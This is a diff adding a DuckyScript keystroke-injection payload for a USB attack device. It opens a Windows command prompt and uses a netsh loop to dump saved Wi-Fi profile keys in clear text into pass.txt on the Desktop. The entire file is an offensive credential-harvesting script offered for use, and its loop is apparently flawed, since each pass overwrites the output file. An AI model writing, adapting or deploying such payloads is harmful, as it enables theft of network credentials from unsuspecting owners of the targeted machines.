@@ -1,0 +1,19 @@
+REM The next three lines execute a command prompt in Windows
+DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+STRING cd Desktop
+DELAY 500
+ENTER
+DELAY 500
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear > pass.txt
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
